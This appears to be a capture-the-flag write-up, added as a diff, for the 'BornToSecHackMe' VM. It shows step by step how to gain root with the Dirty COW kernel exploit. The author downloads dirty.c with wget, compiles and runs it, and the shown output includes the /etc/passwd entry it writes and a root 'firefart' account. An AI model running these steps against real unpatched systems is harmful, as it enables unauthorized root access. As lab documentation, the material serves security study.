@@ -1,1 +1,90 @@
-writeup2
+# Abstract
+
+```console
+laurie@BornToSecHackMe:~$ wget --no-check-certificate https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+[...]
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+laurie@BornToSecHackMe:~$ ./dirty password
+[...]
+laurie@BornToSecHackMe:~$ su firefart
+Password:
+firefart@BornToSecHackMe:/home/laurie# id
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart@BornToSecHackMe:/home/laurie#
+```
+
+***
+
+# Details
+
+## Finding the vulnerability
+
+After a successful login as user _laurie_ via `shh` we can see that the virtual machine runs on the linux kernel version 3.2.0, which is vulnerable to the dirty-cow exploit. 
+
+```console
+laurie@BornToSecHackMe:~$ uname -a
+Linux SnowCrash 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
+```
+
+## Dirty cow exploit
+
+The dirty cow vulnerability is a local privilege escalation bug that exploits a race condition in the kernels memory-management-subsystem. [[1]](https://en.wikipedia.org/wiki/Dirty_COW) We can use this to gain root access on the VM. [[2]](https://www.youtube.com/watch?v=Lj2YRCXCBv8)
+
+First we need to get a program, that is going to create a new user with root privileges for us. [[3]](https://github.com/firefart/dirtycow)
+
+```console
+laurie@BornToSecHackMe:~$ wget --no-check-certificate https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+--2023-01-22 18:31:43--  https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8001::154, 2606:50c0:8000::154, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... connected.
+WARNING: no certificate subject alternative name matches
+	requested host name `raw.githubusercontent.com'.
+HTTP request sent, awaiting response... 200 OK
+Length: 4815 (4.7K) [text/plain]
+Saving to: `dirty.c'
+
+100%[=====================================================================================================>] 4,815       --.-K/s   in 0s
+
+2023-01-22 18:31:44 (88.6 MB/s) - `dirty.c' saved [4815/4815]
+```
+
+Then we need to compile our program. 
+
+```console
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+```
+
+We run it with the password we want our new user to have as a parameter.
+
+```console
+laurie@BornToSecHackMe:~$ ./dirty password
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: password
+Complete line:
+firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
+
+mmap: b7fda000
+```
+
+Now we can check if the creation of the new user was successful. 
+
+```console
+laurie@BornToSecHackMe:~$ su firefart
+Password:
+firefart@BornToSecHackMe:/home/laurie# id
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart@BornToSecHackMe:/home/laurie#
+```
+
+As we can see the user _firefart_ has been added and has root privileges. 
+
+***
+
+# Sources
+
+[1] [https://en.wikipedia.org/wiki/Dirty_COW](https://en.wikipedia.org/wiki/Dirty_COW)
+
+[2] [https://www.youtube.com/watch?v=Lj2YRCXCBv8](https://www.youtube.com/watch?v=Lj2YRCXCBv8)
+
+[3] [https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)
+
